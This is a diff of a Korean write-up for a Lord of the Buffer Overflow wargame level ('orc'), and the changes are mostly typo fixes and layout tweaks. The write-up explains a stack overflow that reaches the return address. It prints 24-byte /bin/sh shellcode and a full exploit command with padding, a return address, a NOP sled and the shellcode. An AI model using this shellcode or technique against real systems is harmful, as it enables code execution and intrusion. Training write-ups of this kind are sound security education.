@@ -64,7 +64,7 @@ main(int argc, char *argv[])
 
 그리고 argv[1]의 48번째 값이 "\xbf"인지 확인한다. 
 
-buffer의 크기가 40byte 이고, SFP 4byte, 그리고 RET 4byte가 들어가므로 argv[1] 배열에 47번째가 "\xbf"라는 것은 **RET에 들어가는 첫번째 주소가 "\xbfxxxxxx"라는 점**이다. 아래 사진을 보면 알 수 있다.
+buffer의 크기가 40byte 이고, SFP 4byte, 그리고 RET 4byte가 들어가므로 argv[1] 배열에 48번째가 "\xbf"라는 것은 **RET에 들어가는 첫번째 주소가 "\xbfxxxxxx"라는 점**이다. 아래 사진을 보면 알 수 있다.
 
 <img src="http://eliez3r.synology.me/assets/img/writeup/lob/04.orc/image-20180828141855222.png" width="600px">{:.rounded.shadow}
 
@@ -101,32 +101,34 @@ main함수를 디스어셈하면 0x80으로 시작되는 영역에 프로그램 
 shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
 
-buffer의 크기가 40byte이므로 쉘코드(24byte)가 들어갈 수 있는 충분한 크기이지만 필자는 NOP크기를 적당이 크게 넣는걸 좋아해서 buffer배열에 쉘코드를 넣지 않고 RET 아래에 쉘코드를 넣을 것이다.
+buffer의 크기가 40byte이므로 쉘코드(24byte)가 들어갈 수 있는 충분한 크기이지만 필자는 NOP크기를 적당히 크게 넣는걸 좋아해서 buffer배열에 쉘코드를 넣지 않고 RET 아래에 쉘코드를 넣을 것이다.
 
-> buffer 배열에 Shellcode를 넣고도 풀어보고, RET주소 뒤 Stack영역에 Shellcode를 넣어서도 풀어는 것을 추천한다.
+> buffer 배열에 Shellcode를 넣는 방법, 그리고 RET주소 뒤 Stack영역에 Shellcode를 넣는 방법 모두 해보는 것을 추천한다.
 
-
+<br>
 
 <img src="http://eliez3r.synology.me/assets/img/writeup/lob/04.orc/image-20180829012542829.png" width="600px">{:.rounded.shadow}
 
-
+정확한 스택 주소를 얻기 위해 core를 떨궈준다.
 
 <img src="http://eliez3r.synology.me/assets/img/writeup/lob/04.orc/image-20180828143818177.png" width="800px">{:.rounded.shadow}
 
-정확한 스택 주소를 얻기 위해 core를 떨궈준다.
-
 "S"가 들어간 위치가 쉘코드 24byte를 넣을 자리이다.
+
+<br>
 
 <img src="http://eliez3r.synology.me/assets/img/writeup/lob/04.orc/image-20180828143927598.png" width="800px">{:.rounded.shadow}
 
 NOP 주소 중 적당한 0xbffffa60 주소를 RET에 넣으면 될 것 같다.
 
+<br>
+
 <img src="http://eliez3r.synology.me/assets/img/writeup/lob/04.orc/image-20180828144129370.png" width="800px">{:.rounded.shadow}
 
 
 
-```
-./orc `python -c 'print "A"*44+"\x60\xfa\xff\xbf"+"\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+```shell
+[goblin@localhost goblin]$ ./orc `python -c 'print "A"*44+"\x60\xfa\xff\xbf"+"\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
 ```
 
 -----
